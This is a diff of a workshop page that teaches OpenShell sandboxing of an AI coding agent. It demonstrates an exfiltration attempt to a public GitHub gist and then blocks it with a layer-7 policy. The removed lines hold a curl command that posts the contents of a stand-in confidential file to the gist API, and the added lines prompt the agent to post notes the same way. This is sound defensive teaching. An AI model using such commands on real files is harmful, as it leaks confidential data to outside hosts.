@@ -1,15 +1,16 @@
 = OpenShell Agent Sandboxing
 :navtitle: OpenShell Agent Sandboxing
 :imagesdir: ../assets/images
-:toc:
+:toc: macro
+:toclevels: 1
 :toc-placement: preamble
 :icons: font
 
 Guardrails protect the model. Sandboxes protect everything else.
 
-{company_name} keeps its underwriting policies in a document that should never leave the organization: DTI limits more conservative than the QM safe harbor, jumbo loan thresholds, rate lock windows, and the exception approval chain. An AI coding agent with file system access and network connectivity could read that document and send it anywhere. OpenShell prevents that.
+In the xref:02-inference/04-access-a-model-through-maas.adoc#_exercise_7_optional_use_opencode_with_maas_as_your_coding_assistant[Inference section], you set up OpenCode as a coding assistant powered by MaaS — keeping prompts and code on-premises. Now let's tackle the other half: constraining what the agent can _do_.
 
-You will stand in for it with a file you create yourself inside the sandbox, so nothing real is ever at risk.
+A coding agent does not know what is sensitive and what is not. Given file system access and network connectivity, it will happily upload internal documents — underwriting thresholds, pricing overrides, meeting notes with confidential figures — to any endpoint it can reach. Even with a self-hosted model, the agent's actions are the risk. OpenShell prevents that.
 
 Estimated time: *10 minutes*
 
@@ -44,7 +45,7 @@ TIP: The sandbox is a real Kubernetes object, so you can inspect it from the ter
 
 Now connect to the running sandbox and see what the agent can access.
 
-. Open a *Terminal* in your workbench (*File > New Terminal* in the VSCode workbench).
+. Go back to your workbench and open up a new terminal. (*File > New Terminal* in the code server workbench)
 
 . Register the gateway. The `openshell` CLI needs to know where the gateway is before it can talk to any sandbox. The gateway runs as a Kubernetes Service in your own project, so you reach it by name — there is no port-forward to start and nothing to keep alive in the background. The first line removes any stale registration from a previous session; the second registers the current endpoint:
 +
@@ -81,18 +82,6 @@ You are now inside the sandbox. This is the agent's runtime environment: deny-by
 NOTE: There is also `openshell sandbox connect <name>`, which attaches to the shell the sandbox was started with. It is the more natural-looking command, but only one client may own that shell's input at a time, and the ownership is tracked by the gateway rather than by your terminal. Once something else holds it - a session that ended without pressing *Ctrl-P Ctrl-Q*, even in a workbench that no longer exists - every later `connect` reports `attached read-only` or simply hangs, and killing local processes does not release it. `exec --tty` allocates its own pseudo-terminal, so it never contends for that and cannot get stuck.
 +
 WARNING: Do not try to clear a stuck `connect` with `openshell sandbox stop`. A stopped sandbox cannot re-bootstrap its gateway token, and every later start fails with `IssueSandboxToken bootstrap exchange failed` - including for newly created sandboxes. If a sandbox really is wedged, delete and recreate it.
-+
-TIP: `openshell sandbox connect <name> --editor vscode` launches a remote editor against the sandbox instead of a shell, installing the SSH config it needs on first use.
-
-. Create the stand-in document the rest of this section will try to steal. Treating it as confidential makes the point without shipping a real file:
-+
-[source,bash]
-----
-cat > /sandbox/internal-policies.txt <<'EOF'
-FED AURA CAPITAL - INTERNAL ONLY
-Underwriting exception thresholds and pricing overrides.
-EOF
-----
 
 . Confirm OpenCode is available inside the sandbox:
 +
@@ -100,14 +89,28 @@ EOF
 ----
 opencode --version
 ----
++
+. Now starts an opencode session inside the sandbox:
++
+[source,bash]
+----
+opencode
+----
++
+. Feel free to send some prompts like before:
++
+[source,bash]
+----
+"Write a Python function that takes a list of numbers and returns the sum of the even numbers in the list."
+----
 
 TIP: Prefer to stay outside the sandbox? `openshell sandbox exec --name fedaura-opencode -- <command>` runs a single command and returns, which is handy for scripted checks.
 
 == Exercise 3: Attempt Data Exfiltration
 
-First see what an agent can do when its egress is open.
+Time to see this in practice. You will ask OpenCode to share some notes via a GitHub gist and watch what happens at the network level — first with egress open, then with policy enforced.
 
-. In the *workbench terminal* (not inside the sandbox), fetch the two policies. They ship in a ConfigMap next to the sandbox, already rendered for your cluster:
+. While keeping the opencode terminal open, let's open up another terminal. It should be the *workbench terminal* (not inside the sandbox), and fetch two sandbox policies. They ship in a ConfigMap next to the sandbox, already rendered for your cluster:
 +
 [source,bash]
 ----
@@ -128,40 +131,36 @@ openshell policy set --policy policy-exfil-open.yaml --wait --timeout 120 fedaur
 +
 GitHub gists are a realistic exfiltration route: a public gist is a document anyone can read, created with a single HTTP request.
 
-. Back inside the sandbox, check that ordinary reads work:
-+
-[source,bash]
-----
-curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
-----
+. Get back to sandboxed OpenCode and give it this prompt:
 +
 [source,text]
 ----
-200
-----
-
-. Now attempt the exfiltration:
-+
-[source,bash]
-----
-curl -s -o /dev/null -w '%{http_code}\n' -X POST https://api.github.com/gists \
-  -d "{\"public\":true,\"files\":{\"leak.txt\":{\"content\":\"$(cat /sandbox/internal-policies.txt)\"}}}"
+Share my meeting notes as a public GitHub gist. Run this curl and show me the full response:
+curl -s -w '\nHTTP_STATUS: %{http_code}' -X POST https://api.github.com/gists -H 'Content-Type: application/json' -d '{"public":true,"files":{"notes.txt":{"content":"Meeting notes: review dashboard layout, update color scheme."}}}'
 ----
 +
-[source,text]
+OpenCode runs the command. The response:
++
+[source,json]
 ----
-401
+{
+  "message": "Requires authentication",
+  "documentation_url": "https://docs.github.com/rest"
+}
+HTTP_STATUS: 401
 ----
++
+image::security-openshell-exfil-401.png[OpenCode terminal showing the 401 Requires authentication response from GitHub,link=self,window=blank,width=700]
 
-That `401` is the important result, and it is worth being precise about what it means. It came *from GitHub* - "Requires authentication". The request left the sandbox, crossed the internet, and was refused only because anonymous gist creation was withdrawn in 2018. Nothing in {company_name}'s platform stopped it.
+That `401` is the important result, and it is worth being precise about what it means. It came *from GitHub* — "Requires authentication". The request left the sandbox, crossed the internet, and was refused only because anonymous gist creation was withdrawn in 2018. Nothing in {company_name}'s platform stopped it.
 
-WARNING: The lesson is not "the upload failed". It is that the only thing standing between an internal document and a public URL was a third party's authentication policy. Give the agent a token - which any real coding agent has - and that request succeeds.
+The content in this example is harmless meeting notes. In production, the agent cannot tell the difference between meeting notes and confidential underwriting thresholds — it will upload whatever it is asked to. The only thing that stood between that data and a public URL was a third party's authentication policy.
+
+WARNING: Give the agent a token — which any real coding agent has — and that request succeeds.
 
 == Exercise 4: Enforce Policy to Block Exfiltration
 
-Now close it again.
-
-. From the *workbench terminal*, apply the standard policy you fetched in exercise 3:
+. Go back to the *workbench terminal*, apply the standard policy you fetched in exercise 3:
 +
 [source,bash]
 ----
@@ -176,27 +175,15 @@ openshell policy set --policy policy.yaml --wait --timeout 120 fedaura-opencode
 +
 The sandbox was never restarted and the agent inside it kept running. Policy is hot-loaded.
 
-. Inside the sandbox, repeat the *read*:
-+
-[source,bash]
-----
-curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
-----
+. In OpenCode, give it the same prompt again:
 +
 [source,text]
 ----
-200
+Share my meeting notes as a public GitHub gist. Run this curl and show me the full response:
+curl -s -w '\nHTTP_STATUS: %{http_code}' -X POST https://api.github.com/gists -H 'Content-Type: application/json' -d '{"public":true,"files":{"notes.txt":{"content":"Meeting notes: review dashboard layout, update color scheme."}}}'
 ----
 +
-Still allowed. The agent can research on GitHub, which is most of what a coding agent legitimately needs it for.
-
-. Repeat the *write* - the same request as exercise 3, with `-o /dev/null` dropped so you can read the response body instead of just its status:
-+
-[source,bash]
-----
-curl -s -X POST https://api.github.com/gists \
-  -d "{\"public\":true,\"files\":{\"leak.txt\":{\"content\":\"$(cat /sandbox/internal-policies.txt)\"}}}"
-----
+This time the response is different:
 +
 [source,json]
 ----
@@ -210,13 +197,32 @@ curl -s -X POST https://api.github.com/gists \
   "policy": "github_readonly",
   "rule_missing": { "type": "rest_allow", "method": "POST", "path": "/gists" }
 }
+HTTP_STATUS: 403
 ----
++
+image::security-openshell-policy-denied-403.png[OpenCode terminal showing the policy_denied response from OpenShell blocking the POST at layer l7,link=self,window=blank,width=700]
+
+. Verify that reads still work — ask OpenCode:
++
+[source,text]
+----
+Check if we can still reach GitHub by running: curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
+----
++
+[source,text]
+----
+200
+----
++
+image::security-openshell-read-200.png[OpenCode terminal showing a successful 200 response for a GitHub GET request after policy enforcement,link=self,window=blank,width=700]
++
+The agent can still research on GitHub, which is most of what a coding agent legitimately needs it for.
 
 Read the difference between the two failures carefully, because it is the whole point of the section:
 
 [cols="1,2",options="header"]
 |===
-| Exercise 3 - open | Exercise 4 - closed
+| Exercise 3 — open | Exercise 4 — closed
 
 | `401 Requires authentication`
 | `policy_denied` at `layer: l7`
@@ -225,7 +231,7 @@ Read the difference between the two failures carefully, because it is the whole 
 | The sandbox answered. The request never left.
 |===
 
-Notice `layer: l7`. The host was not blocked - `GET` to the same host still returns `200`. Enforcement is at the HTTP method and path, so the policy distinguishes *reading GitHub* from *writing to GitHub*. A host-level allowlist could not express that: it would have to choose between blocking research entirely or permitting exfiltration.
+Notice `layer: l7`. The host was not blocked — `GET` to the same host still returns `200`. Enforcement is at the HTTP method and path, so the policy distinguishes *reading GitHub* from *writing to GitHub*. A host-level allowlist could not express that: it would have to choose between blocking research entirely or permitting exfiltration.
 
 The response also names the policy that denied it (`github_readonly`) and the rule that would have been required (`rest_allow` for `POST /gists`). That is the audit trail: not "something was blocked", but which rule, at which layer, for which binary.
 
@@ -264,7 +270,7 @@ Try extending it yourself. The `rule_missing` field in a denial is the template 
 
 . Allow a host you need, then confirm the previously denied request now succeeds.
 . Set a host to `read-only` and watch a `POST` fail at `layer: l7` while `GET` keeps working.
-. Tighten `filesystem_policy` - can you stop the agent reading `/sandbox/internal-policies.txt` at all, so exfiltration fails before the network is even involved?
+. Tighten `filesystem_policy` — can you restrict what the agent can read, so exfiltration fails before the network is even involved?
 
 IMPORTANT: One filesystem rule to know about. A live policy update cannot *remove* a `read_only` path, so a policy you apply to a running sandbox must carry forward the paths already in force - `/app` among them. Drop it and the update is rejected with `read_only path '/app' cannot be removed on a live sandbox`. Add paths freely; removing them needs a new sandbox.
 
